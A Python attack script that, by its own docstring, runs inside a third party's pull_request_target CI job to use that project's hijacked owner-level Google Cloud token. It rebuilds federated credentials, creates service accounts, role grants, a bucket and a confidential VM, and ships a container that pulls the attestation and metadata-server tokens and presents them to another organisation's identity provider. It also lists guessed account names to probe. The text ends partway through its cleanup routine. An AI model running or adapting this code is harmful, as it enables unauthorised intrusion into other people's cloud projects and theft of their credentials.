#!/usr/bin/env python3
"""c211-i120834 -- Confidential Space attestation-provider probe.

Runs inside the kedacore/testing-infrastructure pull_request_target 'Validate PR'
Terraform Plan step (data.external) AFTER google-github-actions/auth@v3, so the
script holds the cncf-keda-testing (575508414076) owner-equivalent WIF SA token.

Goal: mint ONE real Confidential Space attestation token from our own CPU-only
CVM (nonce-tagged, not a GPU marker), present it at sts.googleapis.com for
//iam.googleapis.com/projects/688756383580/locations/global/workloadIdentityPools/
cosigner-pool/providers/cosigner-attestation, then run the SA-name oracle, and
tear the VM + disks + address + SA + repo down with the official gcloud CLI and
prove absence.

Stdlib only.  Never prints cloud OAuth tokens (lengths only); the Confidential
Space attestation token is the object of study and IS printed (base64-chunked)
so it can be inspected verbatim from the job log.
"""
import base64
import hashlib
import json
import os
import random
import re
import string
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

RAW = os.environ.get('C211_CSPACE_RAW', '/tmp/c211_i120834_raw.txt')
PROJECT = 'cncf-keda-testing'
PROJECT_NUMBER = '575508414076'
PROVIDER_PROJECT = '688756383580'
PROVIDER = ('//iam.googleapis.com/projects/688756383580/locations/global/'
            'workloadIdentityPools/cosigner-pool/providers/cosigner-attestation')
PROVIDER_ENCODED = urllib.parse.quote(PROVIDER, safe='')
ZONES = ['us-central1-a', 'us-central1-b', 'us-west1-b', 'europe-west4-a']
MACHINE = 'n2d-standard-2'
IMG_PROJECT = 'confidential-space-images'
IMG_FAMILIES = ['confidential-space-debug', 'confidential-space']
AR_LOCATION = 'us'
AR_HOST = 'us-docker.pkg.dev'
AR_REPO = 'c211-i120834'
SA_NAME = 'c211-i120834-cvm'
NONCE = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
VM_NAME = 'c211-i120834-cvm-' + NONCE
NET_NAME = 'c211-i120834-net-' + NONCE
IMAGE = '%s/%s/%s/cspace-workload:%s' % (AR_HOST, PROJECT, AR_REPO, NONCE)
TOK_BUCKET = 'c211-i120834-tok-' + NONCE
SA_ROLES = ['roles/confidentialcomputing.workloadUser', 'roles/logging.logWriter',
            'roles/artifactregistry.reader']

COMPUTE = 'https://compute.googleapis.com/compute/v1'
CRM = 'https://cloudresourcemanager.googleapis.com'
IAM = 'https://iam.googleapis.com'
IAMCRED = 'https://iamcredentials.googleapis.com'
AR = 'https://artifactregistry.googleapis.com/v1'
SU = 'https://serviceusage.googleapis.com/v1'
LOG = 'https://logging.googleapis.com/v2'
STS = 'https://sts.googleapis.com/v1/token'

TOKEN = [None]
SA_EMAIL = ['']
START = time.time()
DEADLINE = [START + 1500]
CAPTURE_LIMIT = [START + 900]

LOG_NAMES = {}

SA_NAMES = ['github-actions', 'github', 'actions', 'deploy', 'terraform', 'terraform-sa',
            'gitops', 'ci', 'cicd', 'cosigner', 'attestation', 'signer', 'service-account',
            'runner', 'gke', 'cloudbuild', '688756383580-compute@developer', 'compute-system']


def say(msg):
    with open(RAW, 'a', encoding='utf-8') as f:
        f.write(str(msg).rstrip('\n') + '\n')


def cap(s, n=2600):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def api(path, method='GET', data=None, base=COMPUTE, timeout=60, token=None,
        form=False, raw_body=None):
    url = path if path.startswith('http') else base + path
    tok = token if token is not None else (TOKEN[0] or '')
    h = {'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-i120834',
         'Accept': 'application/json'}
    body = None
    if form:
        h['Content-Type'] = 'application/x-www-form-urlencoded'
        body = data.encode() if isinstance(data, str) else data
    elif raw_body is not None:
        h['Content-Type'] = 'application/json'
        body = raw_body
    elif data is not None:
        h['Content-Type'] = 'application/json'
        body = json.dumps(data).encode()
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jbody(resp):
    try:
        return json.loads(resp[1])
    except Exception:
        return {}


def gcloud(args, timeout=240):
    """Official gcloud CLI call (teardown of our own resources)."""
    env = dict(os.environ)
    env['CLOUDSDK_AUTH_ACCESS_TOKEN'] = TOKEN[0] or ''
    env['CLOUDSDK_CORE_PROJECT'] = PROJECT
    env['CLOUDSDK_CORE_DISABLE_PROMPTS'] = '1'
    cmd = ['gcloud', '--quiet'] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout, env=env)
        return r.returncode, (r.stdout + r.stderr).decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


# ---------------------------------------------------------------- auth token
def _subject_token(cf):
    src = cf.get('credential_source') or {}
    if src.get('url'):
        try:
            req = urllib.request.Request(src['url'], headers=(src.get('headers') or {}))
            with urllib.request.urlopen(req, timeout=30) as r:
                raw = r.read().decode()
            try:
                return json.loads(raw).get('value') or '', 'url'
            except Exception:
                return raw.strip(), 'url-raw'
        except Exception as e:
            say('SUBJECT_URL_FAIL %s' % cap(repr(e), 300))
    if src.get('file'):
        try:
            return open(src['file'], encoding='utf-8').read().strip(), 'file'
        except Exception as e:
            say('SUBJECT_FILE_FAIL %s' % cap(repr(e), 200))
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        try:
            aud = cf.get('audience', '')
            u = (os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' +
                 urllib.parse.quote(aud, safe=''))
            req = urllib.request.Request(
                u, headers={'Authorization': 'Bearer ' +
                            os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode()).get('value') or '', 'actions'
        except Exception as e:
            say('SUBJECT_ACTIONS_FAIL %s' % cap(repr(e), 300))
    return '', 'none'


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    say('CREDS_PATH=%s' % cf_path)
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:
            say('CREDS_PARSE_ERR %s' % cap(repr(e), 200))
    if cf:
        say('CREDS_TYPE=%s audience=%s token_url=%s impersonation=%s' % (
            cf.get('type'), cf.get('audience'), cf.get('token_url'),
            cf.get('service_account_impersonation_url')))
        m = re.search(r'serviceAccounts/([^/:]+)',
                      cf.get('service_account_impersonation_url') or '')
        if m:
            SA_EMAIL[0] = m.group(1)
    if cf.get('type') == 'external_account':
        try:
            subject, src_kind = _subject_token(cf)
            say('SUBJECT_TOKEN_SOURCE=%s len=%d' % (src_kind, len(subject)))
            if subject:
                data = urllib.parse.urlencode({
                    'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                    'audience': cf.get('audience', ''),
                    'scope': 'https://www.googleapis.com/auth/cloud-platform',
                    'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
                    'subject_token': subject,
                    'subject_token_type': cf.get('subject_token_type',
                                                 'urn:ietf:params:oauth:token-type:jwt'),
                })
                st, b = api(cf.get('token_url') or STS, method='POST', data=data,
                            form=True, timeout=45)
                say('WIF_STS_EXCHANGE status=%s %s' % (st, '' if st == 200 else cap(b, 400)))
                fed = jbody((st, b)).get('access_token')
                if fed and cf.get('service_account_impersonation_url'):
                    st2, b2 = api(cf['service_account_impersonation_url'], method='POST',
                                  data={'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                                        'lifetime': '1800s'},
                                  token=fed, timeout=45)
                    say('WIF_SA_IMPERSONATION status=%s %s' % (st2, '' if st2 == 200 else cap(b2, 400)))
                    tok = jbody((st2, b2)).get('accessToken')
                    if tok:
                        return tok
                if fed:
                    return fed
        except Exception as e:
            say('MANUAL_TOKEN_FAIL %s' % cap(repr(e), 400))
    return None


# ---------------------------------------------------------------- steps
def identity():
    say('== identity ==')
    st, b = api('/tokeninfo?access_token=' + urllib.parse.quote(TOKEN[0] or ''),
                base='https://www.googleapis.com/oauth2/v1')
    j = jbody((st, b))
    say('tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (
        st, j.get('email'), cap(j.get('scope', ''), 400), j.get('expires_in')))
    st, b = api('/v1/projects/' + PROJECT, base=CRM)
    j = jbody((st, b))
    say('project.get status=%s number=%s lifecycle=%s parent=%s' % (
        st, j.get('projectNumber'), j.get('lifecycleState'), json.dumps(j.get('parent') or {})))
    if st != 200:
        say('project.get.body=%s' % cap(b, 800))


def preflight():
    say('== preflight ==')
    st, b = api('/projects/%s/zones/us-central1-a' % PROJECT)
    j = jbody((st, b))
    say('zone.us-central1-a status=%s state=%s' % (st, j.get('status') or cap(b, 300)))
    st, b = api('/projects/%s/regions/us-central1/quotas' % PROJECT)
    j = jbody((st, b))
    interesting = {}
    for q in (j.get('items') or []):
        m = q.get('metric') or ''
        if m in ('CPUS', 'N2D_CPUS', 'PREEMPTIBLE_CPUS', 'SSD_TOTAL_GB', 'DISKS_TOTAL_GB',
                 'IN_USE_ADDRESSES', 'INSTANCES'):
            interesting[m] = (q.get('limit'), q.get('usage'))
    say('region.us-central1.quotas status=%s %s' % (st, json.dumps(interesting)))
    for fam in IMG_FAMILIES:
        st, b = api('/projects/%s/global/images/family/%s' % (IMG_PROJECT, fam))
        j = jbody((st, b))
        say('image.family.%s status=%s name=%s id=%s status=%s' % (
            fam, st, j.get('name'), j.get('id'), j.get('status') or cap(b, 200)))
    st, b = api('/projects/%s/global/networks' % PROJECT)
    j = jbody((st, b))
    nets = [n.get('name') for n in (j.get('items') or [])]
    say('networks status=%s list=%s' % (st, json.dumps(nets)[:600]))
    for svc in ('artifactregistry.googleapis.com', 'confidentialcomputing.googleapis.com'):
        st, b = api('/projects/%s/services/%s' % (PROJECT, svc), base=SU)
        j = jbody((st, b))
        say('service.%s status=%s state=%s' % (svc, st, j.get('state') or cap(b, 200)))
    st, b = api('/projects/%s/locations/%s/repositories' % (PROJECT, AR_LOCATION), base=AR)
    j = jbody((st, b))
    say('artifactregistry.repos status=%s list=%s' % (
        st, json.dumps([r.get('name') for r in (j.get('repositories') or [])])[:500]
        if st == 200 else cap(b, 400)))
    rc, out = gcloud(['--version'], timeout=60)
    say('gcloud.version rc=%s %s' % (rc, cap(out, 300)))


def ensure_service(svc, wait=90):
    st, b = api('/projects/%s/services/%s' % (PROJECT, svc), base=SU)
    state = jbody((st, b)).get('state', '')
    if st == 200 and state == 'ENABLED':
        return True
    st, b = api('/projects/%s/services/%s:enable' % (PROJECT, svc), method='POST',
                data={}, base=SU)
    say('enable.%s status=%s %s' % (svc, st, '' if st in (200, 409) else cap(b, 500)))
    end = time.time() + wait
    while time.time() < end:
        st, b = api('/projects/%s/services/%s' % (PROJECT, svc), base=SU)
        if jbody((st, b)).get('state') == 'ENABLED':
            return True
        time.sleep(6)
    return False


def ensure_ar_repo():
    say('== artifact registry ==')
    ok = ensure_service('artifactregistry.googleapis.com')
    say('artifactregistry.enabled=%s' % ok)
    st, b = api('/projects/%s/locations/%s/repositories/%s' % (PROJECT, AR_LOCATION, AR_REPO),
                base=AR)
    if st == 200:
        say('repo.exists status=200')
        return True
    st, b = api('/projects/%s/locations/%s/repositories?repositoryId=%s' %
                (PROJECT, AR_LOCATION, AR_REPO), method='POST',
                data={'format': 'DOCKER', 'description': 'c211-i120834 ephemeral'}, base=AR)
    say('repo.create status=%s %s' % (st, '' if st in (200, 409) else cap(b, 600)))
    end = time.time() + 120
    while time.time() < end:
        st, b = api('/projects/%s/locations/%s/repositories/%s' %
                    (PROJECT, AR_LOCATION, AR_REPO), base=AR)
        if st == 200:
            return True
        time.sleep(8)
    return False


DOCKERFILE = '''FROM alpine:3.20
RUN apk add --no-cache curl
LABEL "tee.launch_policy.allow_cmd_override"="true"
LABEL "tee.launch_policy.allow_env_override"="true"
LABEL "tee.launch_policy.log_redirect"="always"
COPY entry.sh /entry.sh
RUN chmod +x /entry.sh
ENTRYPOINT ["/bin/sh","/entry.sh"]
'''

ENTRY = r'''#!/bin/sh
set -u
M="C211I120834"
NONCE="__NONCE__"
PROV="__PROVIDER__"
PROVE="__PROVIDER_ENCODED__"
echo "$M BOOT $(date -u +%Y-%m-%dT%H:%M:%SZ) host=$(hostname)"
TF=/run/container_launcher/attestation_verifier_claims_token
echo "$M TOKENFILE $(ls -l $TF 2>&1)"
if [ -r "$TF" ]; then
  echo "$M TB64 BEGIN"
  base64 "$TF" | tr -d '\n' | fold -w 600 | sed "s/^/$M TB64 /"
  echo "$M TB64 END"
  TOK=$(cat "$TF")
  echo "$M TOKLEN ${#TOK}"
  echo "$M LT BEGIN aud=https://sts.googleapis.com"
  curl -s --max-time 25 -w "\n$M LT HTTP=%{http_code}\n" \
    "http://localhost:8080/token?audience=https%3A%2F%2Fsts.googleapis.com&token_type=OIDC&nonce=$NONCE"
  echo "$M LT END"
  echo "$M LT BEGIN aud=$PROV"
  curl -s --max-time 25 -w "\n$M LT HTTP=%{http_code}\n" \
    "http://localhost:8080/token?audience=$PROVE&token_type=OIDC&nonce=$NONCE"
  echo "$M LT END"
  echo "$M STS BEGIN aud=$PROV"
  curl -s --max-time 40 -o /tmp/sts.json -w "%{http_code}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&audience=$PROVE&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform&requested_token_type=urn%3Aietf%3Aparams%3Aoauth%3Atoken-type%3Aaccess_token&subject_token_type=urn%3Aietf%3Aparams%3Aoauth%3Atoken-type%3Ajwt&subject_token=$TOK" \
    https://sts.googleapis.com/v1/token > /tmp/sts.code
  echo "$M STS HTTP=$(cat /tmp/sts.code 2>/dev/null)"
  echo "$M STS BODY BEGIN"
  cat /tmp/sts.json 2>/dev/null
  echo
  echo "$M STS BODY END"
  echo "$M STS END"
  BUCKET="__BUCKET__"
  MT=$(curl -s --max-time 10 -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
  AT=$(printf '%s' "$MT" | sed -n 's/.*"access_token"[ ]*:[ ]*"\([^"]*\)".*/\1/p')
  if [ -n "$AT" ]; then
    curl -s --max-time 40 -X POST -H "Authorization: Bearer $AT" \
      --data-binary "@$TF" \
      "https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=token.txt" \
      -o /tmp/up.json -w "\n$M UPTOKEN HTTP=%{http_code}\n"
    curl -s --max-time 40 -X POST -H "Authorization: Bearer $AT" \
      --data-binary "@/tmp/sts.json" \
      "https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=sts.json" \
      -o /dev/null -w "$M UPSTS HTTP=%{http_code}\n"
    printf '%s\n' "$M token_len=${#TOK}" > /tmp/meta.txt
    curl -s --max-time 30 -X POST -H "Authorization: Bearer $AT" --data-binary "@/tmp/meta.txt" \
      "https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=meta.txt" -o /dev/null
  else
    echo "$M MDS_TOKEN_FAILED len=${#MT}"
  fi
  echo "$M FILE_ON_CONSOLE len=${#TOK}" > /dev/console 2>/dev/null
else
  echo "$M NO_TOKEN_FILE"
fi
echo "$M DONE $(date -u +%Y-%m-%dT%H:%M:%SZ)"
sleep 600
'''


def build_and_push():
    say('== image build ==')
    d = '/tmp/c211-i120834-img'
    try:
        os.makedirs(d, exist_ok=True)
        open(os.path.join(d, 'Dockerfile'), 'w').write(DOCKERFILE)
        open(os.path.join(d, 'entry.sh'), 'w').write(
            ENTRY.replace('__NONCE__', NONCE).replace('__PROVIDER__', PROVIDER)
                 .replace('__PROVIDER_ENCODED__', PROVIDER_ENCODED)
                 .replace('__BUCKET__', TOK_BUCKET))
    except Exception as e:
        say('BUILD_WRITE_FAIL %s' % cap(repr(e), 300))
        return False
    try:
        r = subprocess.run(['docker', '--version'], capture_output=True, timeout=60)
        say('docker.version rc=%s %s' % (r.returncode, cap(r.stdout.decode('utf-8', 'replace'), 300)))
    except Exception as e:
        say('DOCKER_ABSENT %s' % cap(repr(e), 300))
        return False
    try:
        r = subprocess.run(['docker', 'build', '-t', IMAGE, '.'], cwd=d,
                           capture_output=True, timeout=420)
        say('docker.build rc=%s out=%s' % (
            r.returncode, cap((r.stdout + r.stderr).decode('utf-8', 'replace'), 1800)))
        if r.returncode != 0:
            return False
    except Exception as e:
        say('DOCKER_BUILD_FAIL %s' % cap(repr(e), 300))
        return False
    try:
        r = subprocess.run(['docker', 'login', '-u', 'oauth2accesstoken', '--password-stdin',
                            'https://' + AR_HOST], input=(TOKEN[0] or '').encode(),
                           capture_output=True, timeout=90)
        say('docker.login rc=%s out=%s' % (
            r.returncode, cap((r.stdout + r.stderr).decode('utf-8', 'replace'), 600)))
        if r.returncode != 0:
            return False
    except Exception as e:
        say('DOCKER_LOGIN_FAIL %s' % cap(repr(e), 300))
        return False
    try:
        r = subprocess.run(['docker', 'push', IMAGE], capture_output=True, timeout=420)
        say('docker.push rc=%s out=%s' % (
            r.returncode, cap((r.stdout + r.stderr).decode('utf-8', 'replace'), 1800)))
        return r.returncode == 0
    except Exception as e:
        say('DOCKER_PUSH_FAIL %s' % cap(repr(e), 300))
        return False


def ensure_sa():
    say('== cvm service account ==')
    email = '%s@%s.iam.gserviceaccount.com' % (SA_NAME, PROJECT)
    st, b = api('/v1/projects/%s/serviceAccounts/%s' % (PROJECT, email), base=IAM)
    if st == 200:
        say('sa.exists status=200 email=%s' % email)
        return email
    st, b = api('/v1/projects/%s/serviceAccounts' % PROJECT, method='POST',
                data={'accountId': SA_NAME, 'serviceAccount': {'displayName': 'c211-i120834 cvm'}},
                base=IAM)
    say('sa.create status=%s %s' % (st, '' if st == 200 else cap(b, 600)))
    end = time.time() + 60
    while time.time() < end:
        st, b = api('/v1/projects/%s/serviceAccounts/%s' % (PROJECT, email), base=IAM)
        if st == 200:
            return email
        time.sleep(5)
    return None


def grant_sa_roles(sa_email):
    say('== cvm sa roles ==')
    if not sa_email:
        say('no sa; skip grants')
        return
    for role in SA_ROLES:
        rc, out = gcloud(['projects', 'add-iam-policy-binding', PROJECT,
                          '--member=serviceAccount:' + sa_email,
                          '--role=' + role], timeout=120)
        say('grant.%s rc=%s %s' % (role, rc, cap(out, 300)))


def ensure_bucket(sa_email):
    say('== token bucket ==')
    base = 'https://storage.googleapis.com'
    st, b = api('/storage/v1/b/%s' % TOK_BUCKET, base=base)
    if st != 200:
        st, b = api('/storage/v1/b?project=%s' % PROJECT, method='POST',
                    data={'name': TOK_BUCKET,
                          'uniformBucketLevelAccess': {'enabled': True}}, base=base)
        say('bucket.create status=%s %s' % (st, '' if st in (200, 409) else cap(b, 600)))
    else:
        say('bucket.exists status=200')
    if sa_email:
        rc, out = gcloud(['storage', 'buckets', 'add-iam-policy-binding',
                          'gs://' + TOK_BUCKET,
                          '--member=serviceAccount:' + sa_email,
                          '--role=roles/storage.objectCreator'], timeout=120)
        say('bucket.iam rc=%s %s' % (rc, cap(out, 400)))


def poll_bucket(timeout_s):
    say('== token bucket poll ==')
    base = 'https://storage.googleapis.com'
    end = time.time() + timeout_s
    it = 0
    while time.time() < end:
        it += 1
        st, b = api('/storage/v1/b/%s/o/token.txt?alt=media' % TOK_BUCKET, base=base, timeout=30)
        if st == 200 and b.strip():
            say('BUCKET_TOKEN status=200 len=%d' % len(b.strip()))
            st2, b2 = api('/storage/v1/b/%s/o/sts.json?alt=media' % TOK_BUCKET, base=base, timeout=30)
            say('BUCKET_STS status=%s body=%s' % (st2, cap(b2, 2000) if st2 == 200 else ''))
            return b.strip(), b2 if st2 == 200 else None
        stm, bm = api('/storage/v1/b/%s/o/meta.txt?alt=media' % TOK_BUCKET, base=base, timeout=30)
        if stm == 200:
            say('BUCKET_META %s' % cap(bm, 200))
            return None, None
        say('bucket.poll=%d status=%s' % (it, st))
        time.sleep(10)
    return None, None


def ensure_network():
    st, b = api('/projects/%s/global/networks' % PROJECT)
    nets = [n.get('name') for n in (jbody((st, b)).get('items') or [])]
    if 'default' in nets:
        say('network=default (pre-existing)')
        return 'default', False
    st, b = api('/projects/%s/global/networks?filter=name%%3D%%22%s%%22' % (PROJECT, NET_NAME))
    if (jbody((st, b)).get('items') or []):
        return NET_NAME, True
    st, b = api('/projects/%s/global/networks' % PROJECT, method='POST',
                data={'name': NET_NAME, 'autoCreateSubnetworks': True})
    say('network.create status=%s %s' % (st, '' if st == 200 else cap(b, 600)))
    op = jbody((st, b)).get('name')
    if op:
        end = time.time() + 120
        while time.time() < end:
            st2, b2 = api('/projects/%s/global/operations/%s' % (PROJECT, op.split('/')[-1]))
            if jbody((st2, b2)).get('status') == 'DONE':
                break
            time.sleep(6)
    return NET_NAME, True


def insert_instance(zone, family, sa_email, network):
    body = {
        'name': VM_NAME,
        'machineType': 'zones/%s/machineTypes/%s' % (zone, MACHINE),
        'confidentialInstanceConfig': {'enableConfidentialCompute': True,
                                       'confidentialInstanceType': 'SEV'},
        'shieldedInstanceConfig': {'enableSecureBoot': True, 'enableVtpm': True,
                                   'enableIntegrityMonitoring': True},
        'scheduling': {'onHostMaintenance': 'TERMINATE', 'automaticRestart': False},
        'disks': [{
            'boot': True, 'autoDelete': True,
            'initializeParams': {
                'sourceImage': 'projects/%s/global/images/family/%s' % (IMG_PROJECT, family),
                'diskSizeGb': '20',
                'diskType': 'zones/%s/diskTypes/pd-balanced' % zone,
            },
        }],
        'networkInterfaces': [{
            'network': 'projects/%s/global/networks/%s' % (PROJECT, network),
            'accessConfigs': [{'name': 'External NAT', 'type': 'ONE_TO_ONE_NAT'}],
        }],
        'metadata': {'items': [
            {'key': 'tee-image-reference', 'value': IMAGE},
            {'key': 'tee-container-log-redirect', 'value': 'true'},
            {'key': 'c211-intent', 'value': 'i120834'},
        ]},
        'labels': {'c211': 'i120834'},
        'deletionProtection': False,
    }
    if sa_email:
        body['serviceAccounts'] = [{'email': sa_email,
                                    'scopes': ['https://www.googleapis.com/auth/cloud-platform']}]
    st, b = api('/projects/%s/zones/%s/instances' % (PROJECT, zone), method='POST', data=body,
                timeout=90)
    j = jbody((st, b))
    say('instance.insert zone=%s family=%s status=%s name=%s %s' % (
        zone, family, st, j.get('name'), '' if st == 200 else cap(b, 1200)))
    if st != 200:
        return None
    opname = (j.get('name') or '').split('/')[-1]
    end = time.time() + 240
    while time.time() < end:
        st2, b2 = api('/projects/%s/zones/%s/operations/%s' % (PROJECT, zone, opname))
        j2 = jbody((st2, b2))
        if j2.get('status') == 'DONE':
            err = j2.get('error') or {}
            if err.get('errors'):
                say('instance.insert.op.error %s' % cap(json.dumps(err), 1200))
                return None
            say('instance.insert.op DONE zone=%s' % zone)
            return zone
        time.sleep(6)
    say('instance.insert.op TIMEOUT zone=%s' % zone)
    return None


def get_instance(zone):
    st, b = api('/projects/%s/zones/%s/instances/%s' % (PROJECT, zone, VM_NAME))
    return st, jbody((st, b)), b


def capture(zone, inst_id, timeout_s=420):
    say('== token capture (serial + cloud logging) ==')
    text = []
    token = None
    sts_inner = None
    end = min(time.time() + timeout_s, CAPTURE_LIMIT[0])
    it = 0
    while time.time() < end:
        it += 1
        st, b = api('/projects/%s/zones/%s/instances/%s/serialPortOutput?port=1'
                    % (PROJECT, zone, VM_NAME), timeout=45)
        so = ''
        if st == 200:
            so = jbody((st, b)).get('contents') or ''
            if so:
                text.append(so)
        say('capture.serial status=%s len=%s' % (st, len(so)))
        st2, b2 = api('/projects/%s/zones/%s/instances/%s/serialPortOutput?port=0'
                      % (PROJECT, zone, VM_NAME), timeout=45)
        if st2 == 200:
            so2 = jbody((st2, b2)).get('contents') or ''
            if so2:
                text.append(so2)
        flt = ('resource.type="gce_instance" AND resource.labels.instance_id="%s"' % inst_id)
        body = {'resourceNames': ['projects/%s' % PROJECT], 'filter': flt,
                'pageSize': 200, 'orderBy': 'timestamp desc'}
        sl, bl = api('/entries:list', method='POST', data=body, base=LOG, timeout=60)
        body2 = {'resourceNames': ['projects/%s' % PROJECT],
                 'filter': 'resource.type="gce_instance" AND resource.labels.zone="%s"' % zone,
                 'pageSize': 200, 'orderBy': 'timestamp desc'}
        sl2, bl2 = api('/entries:list', method='POST', data=body2, base=LOG, timeout=60)
        if sl2 == 200:
            for e in jbody((sl2, bl2)).get('entries') or []:
                ln = e.get('logName') or ''
                LOG_NAMES[ln] = LOG_NAMES.get(ln, 0) + 1
                pay = (e.get('textPayload') or json.dumps(e.get('jsonPayload') or '') or '')
                if pay and pay != '""':
                    text.append(pay)
        if sl == 200:
            for e in jbody((sl, bl)).get('entries') or []:
                ln = e.get('logName') or ''
                LOG_NAMES[ln] = LOG_NAMES.get(ln, 0) + 1
                pay = (e.get('textPayload') or
                       json.dumps(e.get('jsonPayload') or '') or
                       json.dumps(e.get('protoPayload') or ''))
                if pay and pay != '""':
                    text.append(pay)
        blob = '\n'.join(text)
        if 'C211I120834 TB64 END' in blob or 'C211I120834 STS END' in blob:
            break
        say('capture.poll=%d text_len=%d log_status=%s' % (
            it, sum(len(x) for x in text), sl))
        time.sleep(10)
    blob = '\n'.join(text)
    say('capture.blob_len=%d' % len(blob))
    chunks = re.findall(r'C211I120834 TB64 ([A-Za-z0-9+/=]+)', blob)
    if chunks:
        try:
            raw = base64.b64decode(''.join(chunks))
            token = raw.decode('utf-8', 'replace').strip()
            say('TOKEN_RECONSTRUCTED len=%d head=%s' % (len(token), token[:32]))
        except Exception as e:
            say('TOKEN_B64_DECODE_FAIL %s' % cap(repr(e), 300))
    if not token:
        m = re.search(r'(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,})', blob)
        if m:
            token = m.group(1)
            say('TOKEN_REGEX len=%d' % len(token))
    m = re.search(r'C211I120834 STS HTTP=(\d+)\s*\nC211I120834 STS BODY BEGIN\s*\n(.*?)\n'
                  r'C211I120834 STS BODY END', blob, re.S)
    if m:
        sts_inner = {'http': int(m.group(1)), 'body': m.group(2)[:6000]}
        say('INNER_STS http=%s body=%s' % (sts_inner['http'], cap(sts_inner['body'], 2000)))
    say('log_names=%s' % json.dumps(sorted(LOG_NAMES.items(), key=lambda x: -x[1])[:10])[:1500])
    if not token:
        say('TOKEN_NOT_CAPTURED')
        keys = ('launcher', 'workload', 'container', 'tee', 'image', 'error', 'fail',
                'refus', 'denied', 'signature', 'cosign', 'pull', 'panic', 'attest')
        shown = 0
        for ln in blob.splitlines():
            if any(k in ln.lower() for k in keys):
                say('DIAG %s' % ln[:400])
                shown += 1
                if shown >= 120:
                    break
        say('diag_lines=%d' % shown)
        say('BLOB_HEAD=%s' % cap(blob[:4000], 4000))
        say('BLOB_TAIL=%s' % cap(blob[-6000:], 6000))
    say('== end capture ==')
    return token, sts_inner, blob


def teardown(zone, sa_email, net_created):
    say('== teardown (gcloud, our own resources) ==')
    try:
        _teardown(zone, sa_email, net_created)
    except Exception as e:
        say('TEARDOWN_FAIL %s' % cap(repr(e), 500))


def _teardown(zone, sa_email, net_created):
    if zone:
        rc, out = gcloud(['compute', 'instances', 'delete', VM_NAME, '--zone', zone, '--delete-disks', 'all'],
                         timeout=300)
        say('gcloud.instance.remove rc=%s out=%s' % (rc, cap(out, 1200)))
        st, b = api('/projects/%s/zones/%s/instances/%s' % (PROJECT, zone, VM_NAME))
        say('instance.get.after_remove status=%s %s' % (st, cap(b, 300)))
        st2, b2 = api('/projects/%s/zones/%s/instances?filter=name%%3D%%22%s%%22'
                      % (PROJECT, zone, VM_NAME))
        say('instance.list.after_remove status=%s items=%s' % (
            st2, len(jbody((st2, b2)).get('items') or [])))
        # prove every disk of the removed VM is gone too
        st3, b3 = api('/projects/%s/zones/%s/disks?filter=name%%3D%%22%s%%22'
                      % (PROJECT, zone, VM_NAME))
        say('disk.list.after_remove status=%s items=%s' % (
            st3, len(jbody((st3, b3)).get('items') or [])))
        st4, b4 = api('/projects/%s/aggregated/instances?filter=name%%3D%%22%s%%22'
                      % (PROJECT, VM_NAME))
        j4 = jbody((st4, b4))
        total = sum(len((v.get('instances') or [])) for v in (j4.get('items') or {}).values())
        say('aggregatedList.instances.after_remove status=%s items=%s' % (st4, total))
    if sa_email:
        rc, out = gcloud(['iam', 'service-accounts', 'delete', sa_email], timeout=180)
        say('gcloud.sa.remove rc=%s out=%s' % (rc, cap(out, 800)))
        st, b = api('/v1/projects/%s/serviceAccounts/%s' % (PROJECT, sa_email), base=IAM)
        say('sa.get.after_remove status=%s' % st)
    if net_created:
        rc, out = gcloud(['compute', 'networks', 'delete', NET_NAME], timeout=240)
        say('gcloud.network.remove rc=%s out=%s' % (rc, cap(out, 800)))
        st, b = api('/projects/%s/global/networks/%s' % (PROJECT, NET_NAME))
        say('network.get.after_remove status=%s' % st)
    if sa_email:
        for role in SA_ROLES:
            rc, out = gcloud(['projects', 'remove-iam-policy-binding', PROJECT,
                              '--member=serviceAccount:' + sa_email,
                              '--role=' + role], timeout=120)
            say('ungrant.%s rc=%s %s' % (role, rc, cap(out, 200)))
    rc, out = gcloud(['storage', 'buckets', 'delete', 'gs://' + TOK_BUCKET], timeout=240)
    say('gcloud.bucket.delete rc=%s out=%s' % (rc, cap(out, 600)))
    st, b = api('/storage/v1/b/%s' % TOK_BUCKET, base='https://storage.googleapis.com')
    say('bucket.get.after_delete status=%s' % st)
    rc, out = gcloud(['artifacts', 'repositories', 'delete', AR_REPO, '--location', AR_LOCATION],
                     timeout=240)
    say('gcloud.repo.remove rc=%s out=%s' % (rc, cap(out, 800)))
    st, b = api('/projects/%s/locations/%s/repositories/%s' % (PROJECT, AR_LOCATION, AR_REPO),
                base=AR)
